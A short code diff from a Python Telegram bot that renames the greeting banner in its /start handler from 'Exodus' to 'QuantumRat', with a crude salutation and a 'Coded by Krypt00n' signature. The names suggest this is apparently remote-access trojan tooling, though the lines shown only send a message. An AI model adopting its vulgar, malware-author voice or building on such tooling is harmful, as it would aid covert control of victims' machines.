@@ -32,7 +32,7 @@ bot = telebot.TeleBot(token)
 
 @bot.message_handler(commands=['start', 'Start'])
 def start(commands):
-	bot.send_message(id_chat, '🌚 Exodus 🌚 ' +   
+	bot.send_message(id_chat, '🌚 QuantumRat 🌚 ' +   
 		'\n\nHi my little pussy, if you want a team then you should write /help' +
 		'\n\nCoded by #~Krypt00n~# | The Revolution Is Coming')
 
